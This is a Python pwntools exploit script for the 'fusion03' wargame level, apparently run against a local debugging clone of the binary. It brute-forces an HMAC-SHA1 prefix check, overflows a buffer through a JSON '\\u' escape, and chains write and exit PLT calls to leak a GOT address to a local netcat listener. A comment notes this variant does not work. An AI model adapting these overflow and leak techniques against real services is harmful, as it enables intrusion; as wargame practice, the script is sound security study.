from pwn import *
import json
import hmac
from hashlib import sha1

############################################################################################################################################################
# INTERACT WITH LOCAL PROGRAM CLONE FOR DEBUGGING
############################################################################################################################################################



level = "fusion03"

err_log_file = open("/home/kali/CLionPrjects/"+level+"/err.log", 'w')
p = process(["/home/kali/CLionPrjects/"+level+"/cmake-build-debug/"+level], stderr=err_log_file.fileno())

def random_string(size=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))


def to_clipboard(data):
    from subprocess import Popen, PIPE
    xsel = Popen(['xsel', '-bi'], stdin=PIPE)
    xsel.communicate(input=data)
    log.info(f"put to clipboard: {data}")


pid = process(["pgrep", level]).recvall()
to_clipboard(pid)


libc = None
elf = None


def init(level):
    global libc
    global elf
    local_dir = "/home/kali/PycharmProjects/fusion/level"+level
    remote_binary = "/opt/fusion/bin/level"+level
    cloned_binary = local_dir+remote_binary
    elf = ELF(cloned_binary)
    libc = ELF(local_dir + "/lib/i386-linux-gnu/libc.so.6")
    context.clear()
    context.binary = cloned_binary
    context.log_file = "/tmp/docgillog"



def gen_payload(token, content, serverip):

    while (True):
        title = random_string(20)

        # msg = json.dumps({
        #     "tags": tags,
        #     "title": title,
        #     "contents": content,
        #     "serverip": serverip
        # })

        # need to do this manually bc json.dumps refuses to accept bytes
        # but target json-c lib does not ;)
        msg = b"{\"tags\": [\"tag1\", \"tag2\", \"tag3\"], \"title\": \"" \
              + bytes(title, "utf-8") \
              + b"\", \"contents\": \"" + content \
              + b"\", \"serverip\": \"" + serverip + b"\"}"

        payload = b""
        payload += token
        payload += b"\n"
        payload += msg

        hashed = hmac.new(token, payload, sha1)
        first_bytes = hashed.hexdigest()[:4]

        # log.debug(f"first_bytes: {first_bytes}")

        if first_bytes == "0000":
            # found hash collision -> valid check passes
            log.debug(f"msg: {msg}")
            log.info(f"Hash: {hashed.hexdigest()}")
            return payload

buf_filler_char = b"A"
overflow_char = b"B"

def gen_overflow_payload(token,overflow,serverip):
    content = b""
    content += buf_filler_char * 1023
    content += b"\\\\u"
    content += overflow
    log.debug(f"content: {content}")
    write("/tmp/docgil", content)
    return gen_payload(token,content,serverip)


listener_port = "4000"

# s = connect("03")
# dmesg = Dmesg(s)


def start_receiving_nc():
    listener_nc = process(["nc", "-l", "-p", listener_port])
    try:
        while True:
            print("waiting for data")
            print(listener_nc.recv())
    except Exception:
        log.warn("listening nc died")

# def start_receiving_nc():
#     listener_nc = process(["nc", "-l", "-p", listener_port, guest_ip])
#     while True:
#         print("waiting for data")
#         print(listener_nc.recvline())


init("03")

thread = threading.Thread(target=start_receiving_nc)
thread.start()
sleep(1)

# nc = s.process(["nc", "localhost", port])

token = p.recv().rstrip().replace(b"\"", b"")
# token = b"// 127.0.0.1:59633-1615872148-93892559-1767467136-447270649"


log.info(f"token: {token}")


# content = b""


# # switch comments for segfault
# content += b"A"*10
# # content += b"A"*1023
# # content += b"\\\\u"
# # content += b"B"*1000

overflow_bytes_until_ret_adr = 164 + 1



log.info("trying to find aslr offset...")

# puts_plt = elf.plt["puts"]

exit_plt = elf.plt["exit"]
exit_got = elf.got["exit"]
write_plt = elf.plt["write"]

log.info("exit_plt: " + hex(exit_plt) + f" {exit_plt}")
log.info("exit_got: " + hex(exit_got) + f" {exit_got}")
log.info("write_plt: " + hex(write_plt) + f" {write_plt}")

# WONT WORK SEE LIBREOFFICE DOC FOR ALTERNATIVE WAYS
overflow = b""
overflow += overflow_char * overflow_bytes_until_ret_adr
overflow += pack(write_plt, 32)
overflow += pack(exit_plt, 32)
# args for write:
# socket fd -> our nc connection
overflow += pack(0x3, 32)
overflow += pack(exit_got, 32)
overflow += pack(0x4, 32)

log.debug(f"overflow: {overflow}")
write("/tmp/docgil", overflow)
# serverip = "127.0.0.1:"+listener_port
serverip = b"127.0.0.1:"+bytes(listener_port, "utf-8")

payload = gen_payload(token, overflow, serverip)

log.info(f"payload: {payload}")

# connect debugger, continue with ctrl+c
p.interactive()
p.send(payload)
# send EOF
p.shutdown()
log.info("payload sent")
# p.wait_for_close()

log.info("debug msges from local process:")
try:
    while True:
        log.info(p.recvline().replace(b"\n", b""))
except EOFError:
    print("done")






